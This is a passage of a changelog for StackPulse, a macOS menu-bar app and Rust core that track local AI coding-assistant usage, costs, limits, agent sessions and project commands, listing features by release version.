  render the exact same Launch / Copy / URLs UI. Swift-only; build clean.

### One-paste demo launch (app 0.13.0)

Made launching a demo app as easy as the "paste one block and it's up" flow: each
web project in Projects now has a single **Launch** button and a **Copy command**
that copies the *whole* recipe — no more copying commands line by line.

- **Copy command** puts one self-contained line on the clipboard:
  `cd '<path>' && <npm install — only if node_modules is missing> && <start with
  the host exposed>`. Paste it anywhere and the app comes up.
- **Launch** runs that same recipe in Terminal (so you see the dev server's own
  output) and opens the browser the moment the port is listening.
- **Shareable URL.** The panel shows the **Local** and **Network** addresses
  (e.g. `192.168.68.71:3100`) — the "temporary IP domain" you can open from your
  phone or another machine on the same Wi-Fi, because the recipe starts the server
  with `--host` / `-H 0.0.0.0` (framework-aware). Tap either to copy.
- **Correct ports.** The port is read from the actual `package.json` script (e.g.
  Praxis's `next dev --port 3100`), not guessed — so the URLs and browser-open are
  right even when the port isn't on the command line. Already-running apps show
  **Open Preview** instead. Swift-only; build clean.

### Command runs — captured outcomes & history (app 0.12.0)

Closes the Phase 1 "command history/outcomes" and Phase 3 "test/build evidence"
gaps — the day-to-day loop of *run a command, did it pass?* now lives in the app.

- **Run in StackPulse (captured).** Every command — and the **Test Project**
  button — can now run **inside** StackPulse with its output streamed live in a
  console sheet, then a clear **Passed / Failed** result with exit code and
  duration. "Run in Terminal" is still there (the terminal icon) for anything you
  want in a real shell. Same safety gate: non-read-only commands still confirm
  first; destructive ones stay extra-warned; a Stop button and a 15-minute
  timeout bound every run.
- **Recent runs.** Outcomes persist across launches (`command_runs.json`), shown
  as a "Recent runs" list in Projects — glance at the last few results, reopen the
  captured output, or re-run (re-running preserves the original safety class).
- Runs execute via `zsh -lc` in the command's directory (login-shell PATH/nvm),
  fully visible — never a hidden in-process execution. Swift-only; build clean.

### Navigation reorganization — 11 sections → 5 (app 0.11.0)

Applied *A Philosophy of Software Design* to the IA: the sidebar was 11 shallow
sections in a technical "Monitor vs Build" split, with the same facts (spend,
limits, recommendations) leaking across many of them. Reorganized around the
**five questions a user actually opens the app with**, each a deep section:

- **Home** — what's happening right now: today's spend + live limits, active AI
  sessions, and anything needing attention (absorbs Overview + live summaries).
- **Usage** — where tokens & money go: a sub-switcher over **Breakdown /
  Trends / Report** (merges the old Usage, Trends, and Reports rows).
- **Missions** — what your agents are doing (with Scope Guard).
- **Advisor** — everything you could improve, one place: **Efficiency /
  Projects / Dependencies** (merges Insights + Discover/Radar + Stack Health).
- **Projects** — your code and what's running: commands, live dev servers, and
  one-tap web preview (merges Services in).

Cross-cutting things stopped being peer rows: **Needs Attention** is now a
toolbar **bell + badge** with an inbox popover; **Reports** is a tab inside
Usage; **Integrations/Settings** stay in the Settings window. Each of the former
section views is unchanged and reused as a sub-pane (single owner of its own
rendering), and the Overview dashboard body was extracted (`OverviewDashboard`)
so Home and Overview share one definition. Swift-only; build clean.

### Scope Guard on missions (app 0.10.0 / protocol 1.12.0)

- **Missions now warn what *kind* of change a session is making.** A new
  **Scope** row on each mission card flags the risk categories among its changed
  files — **secrets/env, database migrations, security/auth code** (high),
  **dependencies, lockfiles, build/CI config** (notable), and **tests** — so you
  can glance at an autonomous session and notice "this touched `.env` and a
  migration" without reading the diff. Color is always paired with a label + icon.
- The first read-only slice of **Safe Automation (Phase 5)**: purely
  path-pattern classification of the `changed_files` the core already gathers —
  deterministic, offline, and honest (it says "these files were touched", never
  "a dependency was added"). Nothing is executed or mutated.
- Protocol 1.12.0 adds `ScopeFlag` / `ScopeFlagKind` / `ScopeSeverity` + the
  additive `Mission.scope_flags` field, computed locally in `scope_guard.rs`.
  **103 core tests** (fmt/clippy clean).

### Repository Radar / Discover (app 0.9.0 / protocol 1.11.0)

- **New Discover section (Repository Radar).** The core scans your approved
  project roots and emits **deterministic, explainable, project-grounded**
  recommendations — never a generic feed. Each card answers the spec's "must
  explain" questions: why it's relevant, **which projects** it affects, the
  **evidence**, **effort**, **risk**, and **whether no change is safer**. Rules
  (all from local facts — filesystem + `git`, no network): missing agent
  instructions (CLAUDE.md/AGENTS.md → agents re-discover the layout each
  session), generated folders not `.gitignore`d, no test command where the stack
  is testable, `.env.example` with no `.env`, stale projects with uncommitted
  work, git repos with no remote/backup, and TypeScript projects with no
  typecheck script. Cards aggregate across projects (with the affected list) to
  stay high-signal; a clean scan shows an honest "nothing to flag" state. Copy a
  single card or **Copy all** as text to paste into a task or an agent prompt.
- Protocol 1.11.0 adds `Recommendation` / `RadarCategory` / `RadarEffort` /
  `RadarRisk` / `RadarReport` + the `get_radar` op and `radar` response. The
  radar engine (`radar.rs`) is portable and offline; **89 → 97 core tests**.
- Verified against the real machine: 29 projects scanned → 6 grounded
  recommendations (e.g. 21 projects with no agent-instructions file, 5 idle
  projects holding uncommitted work), all with real project names + evidence.

### Web Preview + Sidebar tabs + dev-server control (app 0.8.0)

- **One-tap web preview from Projects.** Each web project gains a **Preview on
  Web** button: StackPulse infers the dev command (a discovered `dev`/`start`/
  `serve` command, else `<pm> dev`) and the localhost port (parsed from the
  command — `--port`/`-p`/`PORT=` — else the framework's default), runs it
  **visibly in Terminal**, then opens the browser the moment the port is actually
  listening (a Network-framework readiness poll, no blind delay). If a matching
  dev server is already running it becomes **Open Preview** and opens directly.
- **Sidebar tabs.** The edge sidebar now has a frosted **Cards / Live / Web**
  segmented control (persisted across launches): *Cards* is the rich per-provider
  list, *Live* is active coding sessions + anything needing attention, and *Web*
  lists locally-running dev servers with one-tap Open.
- **Stop a dev server (safe, confirmed).** The Services section can now stop a
  detected dev server — a confirmation dialog, then a graceful `SIGTERM` (never
  `SIGKILL`) so it frees its port cleanly. Read-only everywhere else; this is the
  only mutating action and it's always one explicit, targeted tap.
- Swift-only wave — no protocol or core change. Integrated build clean.

### Richer Missions + Reports (app 0.7.0 / protocol 1.10.0)

- **Missions now show what an agent actually did.** Each mission gains **changed
  files** (from `git status` of the session's project) and a **preview of the
  latest turn**, plus safe **quick actions** (Reveal in Finder, Copy). Protocol
  1.10.0 adds `Mission.changed_files` + `Mission.last_message_preview`, both
  computed locally (git + the existing session-tail read; no network).
- **New Reports section** — a shareable, composed report of your usage, cache
  efficiency, insights, active work, and per-project stack health, with export to
  **Markdown / CSV / JSON** and a copy-summary. Built from data already local; the
  main-window "Monitor" group gains a Reports entry.

### Settings is its own window; the main window is data-only (app 0.6.3 — app-only)

Full separation of configuration from data:
- **New dedicated Settings window** (⌘, or the gear) with two tabs: **Settings**
  (appearance, refresh, notifications, edge sidebar, live limits, power, provider
  connections/API keys, tools, About) and **Integrations** — all the
  configuration, in its own window like a standard macOS preferences window.
- **The main window is now purely dashboards** — Overview, Missions, Insights,
  Usage, Trends, Needs Attention, Projects, Stack Health, Services. **Settings and
  Integrations were removed from its sidebar.** A "Settings" gear sits in the
  sidebar footer (and ⌘,) to open the separate window.
- The popover gear and the ⌘, shortcut both open the Settings window.

### Settings holds only settings (app 0.6.2 — app-only)

Settings was showing live *data* that belongs in the dashboards. It now holds
only controls:

- Removed from Settings: **Last updated**, **UTC bucket**, the refresh **cadence
  read-out** (the control already shows it), and the live-limits **"Last checked"
  + status** (all shown on the Claude card / popover / sidebar).
- Reordered into **preferences & options** first (appearance, refresh, notifications,
  edge sidebar, live limits, power, provider connections), then **tools** (Command
  Center, export), then a clearly-separated **About** footer for the static
  reference the spec requires there (versions, cost methodology, accessibility).

### Navigation reorganized (app 0.6.1 — app-only)

The information (Overview, Missions, Insights, Usage, Trends…) all sat in one flat
list you reached via the Settings gear, with Settings lumped in among it. Now:

- **Main-window sidebar is grouped** — **Monitor** (Overview, Missions, Insights,
  Usage, Trends, Needs Attention), **Build** (Projects, Stack Health, Services),
  **Providers** (Integrations) — with **Settings pinned separately at the bottom**
  so it reads as app settings, not another dashboard.
- **The popover "Open" button lands on the Overview dashboard**, not wherever the
  window was last (often Settings). The gear still goes straight to Settings.
- **The edge sidebar ("side card") gained an "Open in app" launcher** — one tap
  jumps to Overview / Usage / Trends / Missions / Insights / Stack Health, so the
  useful views are one click away instead of buried.

### Stack Health + Services — Phase 4 begins (app 0.6.0 / protocol 1.9.0)

The app was heavy on *watching* (usage/analytics) and light on the spec's
differentiators. This starts closing that gap with two new main-window sections.

- **Stack Health** — "is each project's stack current, compatible, and secure?"
  The portable core parses your **npm + Cargo** manifests/lockfiles into an
  offline dependency inventory (installed versions); the macOS app then fetches
  **latest versions** from the npm/crates registries and **security advisories**
  from **OSV**, flagging what's outdated (minor vs. major) or vulnerable. Network
  lives in the app layer, not the core, so the core stays pure/portable.
- **Services** — "what's running right now?" The core detects local **dev servers
  by listening TCP port** (`lsof`) and matches them to your projects; the app
  lists them grouped by project with the port, kind, and an **Open** action.
- Protocol **1.9.0** (additive): `ProjectStack` / `Dependency` / `Advisory` /
  `DependencyStatus` / `AdvisorySeverity` / `StackSummary` + `get_stack_health`;
  `RunningService` + `get_services`.

### Richer edge sidebar, sidebar positioning, quick Settings, deeper Antigravity (app 0.5.0)

- **The edge sidebar is actually useful now.** It was a name + one percentage per
  provider; it now leads with a **totals strip** (today's spend + tokens, live
  session count, items-to-check), an **Active-now** block, needs-attention, and
  **rich per-provider rows** — tokens · turns · cache% for measured providers, or
  sessions · model for activity-only ones (Antigravity), plus the hottest limit
  meter.
- **Sidebar can pin left or right.** A **⇄ quick toggle** in the sidebar header
  flips the edge live, plus a Left/Right control in **Settings → Edge sidebar**.
  Persisted; the panel re-pins instantly.
- **Quick Settings from the menu bar.** The popover now has a clear **gear →
  Settings** button (Command Center moved after it, still one click / ⌘⇧C).
- **Deeper Antigravity.** Real **agent-step counts** per conversation, read from
  the SQLite trajectories via `rusqlite` scoped to the **macOS target only** (the
  portable-core Linux/Windows CI gates never pull a C toolchain; the DB is opened
  read-only and coexists safely with Antigravity writing it). Antigravity missions
  now show real activity (e.g. "464 steps") instead of "0 turns", and the card
  notes total agent steps.

### Claude live-limits: stale-token handling (app 0.4.1 — app-only)

- **Fixed the misleading "Sign in to Claude" message.** StackPulse reads Claude
  Code's saved OAuth token (and never refreshes it — refreshing could rotate the
  token and sign you *out* of Claude Code). When that saved token expires, the
  card used to say "Sign in to Claude Code," which reads as *signed out* even
  though you aren't. It now says the saved login has expired and will resume when
  Claude Code renews it. A genuine 401 (real re-auth needed) is worded distinctly.
- **The last-known % now survives.** Live limits are persisted to disk and shown
  with an honest **"as of …"** label when a fresh value can't be fetched (expired
  token, offline, rate-limited) — instead of the card blanking. The cache window
  extends to a few days since Claude's dominant window is weekly (slow-moving).

### Antigravity real-data scanner (app 0.4.0 — core behavior, no protocol change)

- **Antigravity now shows real local data** instead of a detection-only "no
  data" state. It's a Windsurf/Codeium-style agent IDE (talks to Gemini); the new
  `providers::antigravity` scanner reads `~/.gemini/antigravity/conversations/*.db`
  for **conversation count, recency, and the model** (`gemini-3-flash-agent`,
  recovered by a bounded byte-scan — **no SQLite dependency**). Token and cost are
  managed **server-side** by Gemini and aren't available locally, so they are
  honestly not shown (no fabricated numbers) — the card explains this.
- **In-progress Antigravity sessions surface as Missions** — they appear in the
  Missions view and the menu-bar ▶N active-session count, alongside Claude/Codex.
- **Activity-aware provider card.** A provider with local activity but no local
  token/cost accounting (Antigravity) now shows a **session + model row** instead
  of a misleading "$0 · 0 tokens" spend row.
- The engine registers three full scanners (Claude, Codex, Antigravity) + eight
  detection-only providers (still eleven total). Antigravity's capability matrix
  gains auth / local-session-history / live-task-detection. +3 tests.

### Insights & reporting (app 0.3.0 / protocol 1.8.0)

- **Derived insights engine (core, protocol 1.8.0).** New `Insight` /
  `InsightImpact` / `InsightKind` types + an additive `UsageSnapshot.insights`
  list. The portable core now turns each scan into ranked, actionable
  observations — all computed **locally**, no network: **low cache efficiency**
  (savings left unclaimed), **spend anomaly** (today vs. the 30-day average),
  **approaching limit** (a heads-up band that sits a notch below the alert
  threshold so the two never double-fire), **idle provider** (detected but unused
  30 days), **cost concentration** (one model dominating spend), and a hedged
  **possibly-stalled session** (an AI coding session idle mid-task — surfaced for
  you to judge, never auto-acted upon). Ranked most-useful-first. 19 new tests.
- **Insights section (app).** A new **Insights** sidebar destination with a count
  badge, impact-grouped Liquid-Glass cards (High → Medium → Low), each showing the
  provider, a highlighted metric, and a relative time — plus a friendly empty
  state and a "these are suggestions; nothing changes automatically" reassurance.
- **Data export & reporting (app).** Export your usage as **CSV or JSON** and a
  one-click **Copy summary** — snapshot export + Copy summary live in Settings
  ("Data & export"), history export lives in Trends. Saves go through a standard
  save panel (you pick the location); everything stays on your Mac.

### Notifications & proactive alerting (app 0.2.0 — app-only, no protocol/core change)

- **Native macOS notifications for needs-attention alerts.** When a new alert
  appears (a usage limit nearing its cap, a spend anomaly, an integration issue),
  StackPulse now raises a system notification — a menu-bar app is far more useful
  when it can tap you on the shoulder instead of only showing state when opened.
  Clicking a notification opens the app on the needs-attention section.
  Everything stays local: notifications only ever surface an alert already derived
  from your own data; nothing is originated or sent anywhere.
- **Transition-based, non-spammy delivery.** A pure, self-tested gate
  (`NotificationGate`) notifies only when an alert *newly* becomes active — the
  first snapshot after launch seeds silently (no burst for pre-existing state),
  a persisting alert never re-fires, and a cleared-then-returning condition
  notifies again. Re-delivery replaces (not stacks) by alert id.
- **Proactive Claude live-limit alerts.** The offline core can't see Claude's
  live session/weekly limits, so it never alerted on them. The app now synthesizes
  needs-attention alerts from the merged live limits — warning at ≥ 80%, critical
  at ≥ 95% — surfaced across the popover, inbox, and menu-bar badge, and eligible
  for notification. Codex limit alerts continue to come from the core (no dupes).
- **Notification preferences (Settings).** Master toggle, a severity threshold
  (All / Warnings+ / Critical), quiet hours (a from/to window that may wrap
  midnight, muting banners while keeping alerts in-app), a one-click *Send a test
  notification* button, and a hint when banners are disabled in System Settings.
  All persisted in `UserDefaults`.
- **Self-tests + a diagnostic.** `--selftest-parsers` now also asserts the
  notification gate and quiet-hours logic; `--selftest-notify` posts a test banner
  and reads it back from Notification Center as an end-to-end delivery probe.
- **Fixed:** a Swift 6 actor-isolation trap (`dispatch_assert_queue_fail`) that
  crashed the app on launch — the `UNUserNotificationCenter` Objective-C
  completion bridge, invoked from a `@MainActor` context, resumed its continuation
  with a main-actor isolation check that failed on the daemon's background queue.
  The center calls now run from a `nonisolated static` helper, hopping back to the
  main actor only to publish results.

### Added

- **Portable Rust core (`stackpulse-core`, 0.1.0).** A platform-neutral engine
  that detects supported providers, scans their local logs, normalizes tokens,
  estimates cost, aggregates windows, and dispatches requests. Builds for
  non-macOS targets (no platform-specific code). Entry points: `Engine` and
  `handle_request_json(&str) -> String`.
- **Versioned protocol (`stackpulse-protocol`, `PROTOCOL_VERSION = 1.0.0`).**
  Serde contracts shared across the ecosystem: `ProviderId`, `Capability`,
  `CapabilityState`, `IntegrationHealth`, `Provenance`, `TokenTotals`,
  `SpendWindow`, `ModelUsage`, `LimitWindow`, `ProviderUsage`, `UsageSnapshot`,
  and the `CoreRequest`/`CoreResponse` envelopes with `CoreError`/`ErrorCode`.
  Forward-compatible by design (`#[serde(other)]` for unknown provider ids,
  `#[serde(default)]` for additive fields).
- **Claude (Claude Code) local-cost scanner.** Reads `{root}/projects/**/*.jsonl`
  with config-root resolution (`$CLAUDE_CONFIG_DIR` → `$XDG_CONFIG_HOME/claude`
  → `~/.config/claude` → `~/.claude`); sums `message.usage.*` token counts;
  deduplicates by `(message.id, requestId)`; reports per-model breakdown and
  cache metrics. Claude's `input_tokens` already excludes cache, matching the
  core's exclusive-input convention. Auth is detected by credential presence
  only (file or Keychain), never by reading the secret.
- **Codex (OpenAI Codex CLI) local-cost scanner.** Reads
  `$CODEX_HOME/sessions/**/*.jsonl` and `archived_sessions/**/*.jsonl`; sums the
  per-turn `last_token_usage` delta (not the cumulative total); tracks the active
  model from `turn_context`; captures **provider-reported 5-hour and weekly
  rate-limit windows** from `payload.rate_limits` with **zero network calls**.
  OpenAI's `input_tokens` (which includes cached) is normalized to
  `fresh_input = input - cached`.
- **Detection-only adapters** for the other nine providers (Antigravity, GitHub
  Copilot, Cursor, Devin, **Gemini**, Grok, OpenCode, OpenRouter, Z.ai), driven
  by a single data-driven `DetectableProvider`. Honest installed/authenticated
  detection (presence-only; secrets never opened), best-effort markers annotated
  with confidence, and a fully-enumerated capability matrix. Cloud/API-key
  providers with no local footprint (Devin, OpenRouter, Z.ai) report
  `not_detected`.
- **Gemini (Google) provider** (protocol **1.3.0** — `ProviderId` gained a
  `Gemini` variant). Detected via the Gemini CLI's own markers (`gemini` on
  `$PATH`, `~/.gemini/oauth_creds.json`); the shared `~/.gemini` directory is
  deliberately not treated as a marker because Antigravity writes there too.
  Live quota (Google OAuth usage API) is Planned; detection-only for now.
- **Efficiency analytics** per provider (protocol **1.1.0**, additive): measured
  cache savings (USD the prompt cache saved vs. paying full input rate), estimated
  burn rate ($/active-day), 30-day cache-hit rate, a 30-day daily history for
  charts, and a `today_vs_avg_ratio` spend-anomaly signal. Surfaced in the
  Overview and Usage sections. Measured vs. estimated values are labeled distinctly.
- **Needs-attention alerts** (protocol **1.2.0**, additive): the core derives
  alerts locally from each snapshot — usage-limit thresholds (≥75% warning, ≥90%
  critical), degraded integration health, and spend anomalies — with no network.
  Surfaced as a menu-bar badge, a popover "Needs attention" block, and a
  Needs-Attention inbox in the main window (acknowledge/dismiss).
- **Edge sidebar** — an always-on-top, non-activating `NSPanel` pinned to the
  screen edge with a compact provider + alerts summary, toggled by ⌥⌘S.
- **Keep Awake** — an opt-in power assertion that prevents system sleep while
  monitoring (idle-system-sleep only; display may still sleep).
- **Liquid Glass design system** — a hand-crafted glass material (frosted base +
  diagonal refraction sheen + rim-light edges + colored glow), glossy pill
  segmented controls with a sliding knob, glazed active navigation states, and a
  glass button style. Reduce-Transparency and Reduce-Motion aware; premium in
  both light and dark. (The native macOS 26 `glassEffect` API is unavailable
  under the macOS 15.2 Command Line Tools SDK, so the look is built from SwiftUI
  primitives that run on macOS 14+.)
- **Appearance control** — a System / Light / Dark switcher (glass pill) in
  Settings, applied app-wide (popover, main window, edge sidebar) and persisted.
- **Claude live usage limits** (opt-in, network) — reads the local Claude Code
  login from the macOS Keychain and fetches Anthropic's official OAuth usage API
  (`GET /api/oauth/usage`), giving Claude a real session/weekly limit % in the
  menu bar and popover like Codex. Token stays in memory, HTTPS to Anthropic only,
  never logged/persisted; expired tokens are not refreshed. Off = fully offline.
  A Settings toggle controls it (default on, since the user consented).
- **Project Navigator & Command Memory** (protocol **1.4.0** — `Project`,
  `DiscoveredCommand`, `GetProjects`). Scans user-approved folders for projects
  (git/node/rust/swift/python/go/docker/…), detects frameworks + package manager
  + git branch/remote, and discovers & **safety-classifies** their commands
  (package scripts, Makefile/justfile/Taskfile targets, framework conventions).
  Read-only; never executes anything in the core. A **Projects** section runs the
  right test/build/dev command (copy or run-in-Terminal, with a confirmation for
  anything not read-only).
- **Gemini live quota** wiring is stubbed for a future release; Gemini remains
  detection-only for now.
- **Agent Mission Control** (protocol **1.5.0** — `Mission`, `MissionStatus`,
  `UsageSnapshot.missions`). The core normalizes recently-active AI coding
  sessions from local logs (Claude, Codex) into missions — project, branch,
  model, last activity, token velocity, and an activity status
  (active / idle / recent) — read-only, no network, no process control.
  Surfaced in a Missions section, the Command Center live-activity panel, and an
  active-count indicator in the menu bar + popover.
- **Usage history & trends** (protocol **1.6.0** — `HistoryPoint`,
  `record_history` / `get_history` ops). A durable per-day, per-provider history
  is persisted to a plain JSON store under the app's Application Support dir,
  seeded from the 30 days already in the analytics and then accumulating beyond
  the log-rotation window. A **Trends** section charts multi-month cost/token
  history with a 30d / 90d / All range and a per-provider breakdown. (A plain
  JSON store, not SQLite — the data is tiny and it keeps the core dependency-light.)
- **BYOK provider connections** (protocol **1.7.0** — `ProviderBalance`, optional
  `ProviderUsage.balance`). A Settings "Provider connections" card lets you enter
  API keys for API-key providers; keys are stored in StackPulse's own macOS
  Keychain and sent only to that provider's API. **OpenRouter** and **LiteLLM**
  report a real credit balance (remaining / used / limit) shown on the provider
  card + Integrations. Populated in the app layer, so the portable core stays
  offline. Other API-key providers are connectable now, with balance fetchers to
  follow.
- **Embedded pricing table** of approximate public list prices per 1M tokens
  (as of 2026-07) for the Claude (Opus/Sonnet/Haiku) and OpenAI GPT-5/Codex
  families. All derived costs are labeled `LocalEstimate` and never presented as
  billed amounts. Unpriceable models are excluded from cost totals and surfaced
  in a note.
- **C ABI FFI bridge (`stackpulse-ffi`, `staticlib` + `cdylib`).** Functions
  `sp_core_handle_request(json) -> json`, `sp_core_version()`, and
  `sp_core_string_free()`, with a documented single-owner memory contract and
  panic-safety at the boundary.
- **`stackpulse` CLI.** `snapshot` (human summary or `--json`), `status`,
  `ping`, and raw `request` subcommands. Also serves as the portability
  smoke-test target.
- **macOS menu-bar app (`apps/StackPulseMac`, SwiftPM).** An `NSStatusItem`
  accessory app (no Dock icon) with a SwiftUI liquid-glass popover that links the
  Rust static library and decodes the same protocol JSON as the CLI. Includes a
  presence-only macOS Keychain probe for Claude credentials, a background scan
  off the main actor, and headless `--dump` / `--version` verification modes.
- **UTC date bucketing.** Windows (today / yesterday / last 30 days) are bucketed
  by UTC date in this version; the snapshot discloses `bucket_date_utc` so the UI
  can label windows as UTC-based. See
  [ADR-0007](docs/decisions/0007-utc-bucketing-v0.md).
- **Documentation set.** Architecture, protocol, capability matrix, compatibility,
  security boundaries, cross-repo changelog, and the initial ADRs.

### Security

- No network access in this version; scanning is read-only; symlinked directories
  are not followed during traversal; credentials are detected by presence only.
  See [`docs/SECURITY_BOUNDARIES.md`](docs/SECURITY_BOUNDARIES.md).

### Known limitations

- Only **Claude** and **Codex** have full local usage/cost scanners. The other
  eight (Antigravity, GitHub Copilot, Cursor, Devin, Grok, OpenCode, OpenRouter,
  Z.ai) are **detection-only** — installed/authenticated detection and a
  capability matrix, but no usage scanning yet.
- No live provider usage APIs (Claude's OAuth usage endpoint is not wired).
- No persisted history/database; snapshots are computed on demand.
- No code signing, notarization, DMG, or Sparkle auto-update yet.
- Cost figures are list-price **estimates**, not billed amounts.

[Unreleased]: https://github.com/saasmaster/stackpulse-mac
